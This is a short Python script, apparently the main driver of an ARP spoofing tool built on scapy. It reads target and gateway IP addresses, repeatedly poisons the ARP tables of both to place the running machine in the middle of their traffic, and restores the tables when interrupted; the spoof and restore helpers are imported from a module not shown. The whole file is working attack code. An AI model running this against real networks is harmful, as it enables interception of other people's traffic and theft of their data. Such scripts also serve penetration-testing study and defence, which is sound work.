#!/usr/bin/env python

import optparse 
import scapy.all as scapy
import time
import sys

from lib.arp_spoof import *

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-g", "--gateway", dest = "gateway", help = "IP gateway")
    parser.add_option("-t", "--target", dest = "target", help = "IP target")
    (options, arguments) = parser.parse_args()

    return options

def main():
    args = get_arguments()

    target = args.target
    gateway = args.gateway

    sent_packets_count = 0

    try:
        while True:
            #spoofing target
            spoof(target, gateway)
            #spoofing router
            spoof(gateway, target)
            sent_packets_count += 2
            print("\r[+] Packets sent: " + str(sent_packets_count)),
            # time.sleep(1)
            # Python 3
            #print("\r[+] Packets sent: " + str(sent_packets_count), end = "")
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
        restore(target, gateway)
        restore(gateway, target)

main()